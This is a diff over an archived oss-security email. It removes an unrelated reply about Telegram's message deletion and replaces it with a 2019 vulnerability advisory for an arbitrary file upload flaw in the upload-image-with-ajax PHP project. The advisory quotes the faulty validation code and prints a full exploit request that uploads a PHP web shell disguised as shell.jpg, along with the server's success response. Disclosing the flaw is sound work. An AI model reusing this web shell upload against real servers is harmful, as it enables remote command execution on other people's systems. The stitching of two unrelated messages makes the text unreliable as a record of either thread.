@@ -1,41 +1,68 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/09/16/1
-Message-ID: <d1f53010-1e58-c4f5-7a91-e8fa3402f984@gmail.com>
-Date: Mon, 16 Sep 2019 14:34:19 +0200
-From: Jiri 'Ghormoon' Novak <ghormoon@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: Telegram privacy fails again.
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/12/23/1
+Message-ID: <E98B12D6-2DD9-43AA-A854-DD45B36AC5C5@me.com>
+Date: Mon, 23 Dec 2019 12:09:16 -0500
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Security <oss-security@...ts.openwall.com>
+Subject: Arbitrary file upload vulnerability in upload-image-with-ajax v1.0
 Content-Type: text/plain; charset=utf-8
 
-Honestly, the biggest issue with that feature is that by default, the
-checkbox is not ticked and if you delete it accidentally for yourself
-first, you won't ever remove it for the other person.
+Title: Arbitrary file upload vulnerability in upload-image-with-ajax
+Author: Larry W. Cashdollar
+Date: 2019-12-16
+CVE-ID:[CVE-2019-8292]
+Download Site: https://github.com/abcprintf/upload-image-with-ajax/
+Vendor: adcprintf
+Vendor Notified: 2019-12-16
+Vendor Contact: wh.cprintf@...il.com
+Advisory: http://www.vapidlabs.com/advisory.php?v=211
+Description: upload-image-with-ajax
+Vulnerability:
+The code below changes the $ready flag to true if the file conforms to the size of < 1000000. Reversing the check that the file is an image. So, a .php file can be uploaded with only a warning allowing code execution.
 
-Regarding the average user thinking the feature is secure, how would you
-think it should be done? rephrase it to "try to delete" or what?
+$ready = false;
+if((($imageType == "image/jpeg") || ($imageType == "image/jpg") || ($imageType == "image/png"))&&in_array($fileExt, $validext)){
+$ready = true;
+}else{
+echo "was not an image
+";
+/You should abort the upload right here/
+}
+if($_FILES["fileUpload"]["size"] < 1000000){
+$ready = true;
+echo "file size is ".$_FILES['fileUpload']["size"]."
+";
+}else{
+echo "file was TOO BIG!";
+}
 
-Gh.
+Exploit Code:
+ $ ./fileupload_exploit 192.168.0.3 80 /upload-image-with-ajax/upload.php
+POST request size is 469 bytes
+ 
+Sending Payload:
+POST //upload-image-with-ajax/upload.php HTTP/1.1
+Host: 192.168.0.3
+User-Agent: File Upload Exploiter/v1.2
+Accept: */*
+Content-Length: 237
+Content-Type: multipart/form-data; boundary=------------------------c8e05c8871143853
+ 
+--------------------------c8e05c8871143853
+Content-Disposition: form-data; name="fileUpload"; filename="shell.jpg"
+Content-Type: image/jpeg
+ 
+<?php $cmd=$_GET['cmd']; system($cmd);?>
+ 
+--------------------------c8e05c8871143853--
+ 
+HTTP/1.1 200 OK
+Date: Mon, 16 Dec 2019 04:39:56 GMT
+Server: Apache/2.4.25 (Debian)
+Content-Length: 37
+Content-Type: text/html; charset=UTF-8
+ 
+file size is 42<br>upload successful!
+[+] Total bytes read: 185
 
-On 9/13/19 1:20 PM, Stuart Henderson wrote:
-> On 2019/09/12 18:29, notspam@...st wrote:
->>> IMO, If Whatsapp/Telegram wanted to take this functionality more seriously,
->>> they'd need to be writing the images to disk in an encrypted form from the
->>> outset. It increases the overhead of display, and wouldn't necessarily stop
->>> forensic recovery etc, but it would mean that other apps couldn't simply
->>> watch the directory and upload anything which appears in it in a usable
->>> form. That's a whole other can of worms though as it's another set of keys
->>> to manage.
->> There's no way to take this functionality seriously - the feature is a
->> joke. A privacy feature centered around trusting another user's
->> node to delete a file you already sent them is silly. Unfortunately,
->> it seems like nobody gets this; even Matrix clients are supposed to
->> have message redaction soon.
-> It is still a useful feature as long as you don't consider it "secure".
->
->> The original email didn't contain a security vulnerability (remember
->> the name of this list?)  - it was blogspam. It didn't belong here for
->> the same reason that you don't see Snapchat bugs on this list.
-> If a user of the software took the "delete" claim at face value then it
-> could be considered security related .. and unlike Snapchat, the Telegram
-> client *is* open source.
->
+
